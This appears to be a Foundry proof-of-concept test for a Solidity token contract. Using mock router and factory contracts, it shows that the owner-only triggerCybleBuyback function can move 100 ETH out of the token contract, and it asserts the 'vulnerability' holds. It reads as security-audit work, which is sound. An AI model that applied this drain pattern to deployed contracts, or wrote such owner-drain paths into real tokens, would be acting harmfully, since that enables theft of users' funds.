// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/DigitalattoCoin.sol";

contract MockRouter is IDEXRouter {
    address public constant FACTORY = address(0x1234);
    address public constant WETH_ADDR = address(0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6);
    uint256 public receivedValue;
    
    function factory() external pure override returns (address) { return FACTORY; }
    function WETH() external pure override returns (address) { return WETH_ADDR; }
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable override returns (uint amountToken, uint amountETH, uint liquidity) { revert(); }
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 /* amountOutMin */,
        address[] calldata /* path */,
        address /* to */,
        uint256 /* deadline */
    ) external payable override {
        receivedValue = msg.value;
    }

    // Unused functions
    function addLiquidity(
        address, address, uint, uint, uint, uint, address, uint
    ) external pure override returns (uint, uint, uint) { revert(); }
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint, uint, address[] calldata, address, uint
    ) external override { revert(); }
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint, uint, address[] calldata, address, uint
    ) external override { revert(); }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x12345);
    }
}

contract ArbitrarySendETHTest is Test {
    DigitalattoCoin token;
    MockRouter router;
    address owner = makeAddr("owner");
    uint256 constant INITIAL_ETH = 1000 ether;

    function setUp() public {
        router = new MockRouter();
        
        // Mock the factory at router.FACTORY address
        MockFactory mockFactory = new MockFactory();
        vm.etch(router.FACTORY(), address(mockFactory).code);

        vm.startPrank(owner);
        token = new DigitalattoCoin(address(router));
        vm.deal(address(token), INITIAL_ETH);
        vm.stopPrank();
    }

    function test_CybleBuybackDrainsETH() public {
        uint256 drainAmount = 100 ether;
        
        console2.log("--- BEFORE-Trigger ---");
        uint256 tokenBalanceBefore = address(token).balance;
        console2.log("Token contract ETH balance:", tokenBalanceBefore);
        uint256 routerValueBefore = router.receivedValue();
        console2.log("Router initial receivedValue:", routerValueBefore);

        console2.log("--- Trigger: triggerCybleBuyback ---");
        vm.prank(owner);
        token.triggerCybleBuyback(drainAmount, false);

        console2.log("--- AFTER-Trigger ---");
        uint256 tokenBalanceAfter = address(token).balance;
        console2.log("Token contract ETH balance:", tokenBalanceAfter);
        uint256 routerValueAfter = router.receivedValue();
        console2.log("Router receivedValue after transfer:", routerValueAfter);

        uint256 tokenDiff = tokenBalanceBefore - tokenBalanceAfter;
        uint256 routerDiff = routerValueAfter - routerValueBefore;
        console2.log("Token ETH balance change: %s (expected: %s)", tokenDiff, drainAmount);
        console2.log("Router receivedValue change: %s (expected: %s)", routerDiff, drainAmount);

        bool tokenBalanceChangedCorrectly = tokenDiff == drainAmount;
        bool routerValueChangedCorrectly = routerDiff == drainAmount;
        bool vulnerabilityExploited = tokenBalanceChangedCorrectly && routerValueChangedCorrectly;

        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: The function successfully drained %s ETH from token contract to router", drainAmount);
        } else {
            console2.log("Vulnerability not Exist: ETH drainage did not occur as expected");
        }
        
        assertTrue(vulnerabilityExploited, "Vulnerability exploitation check");
    }
}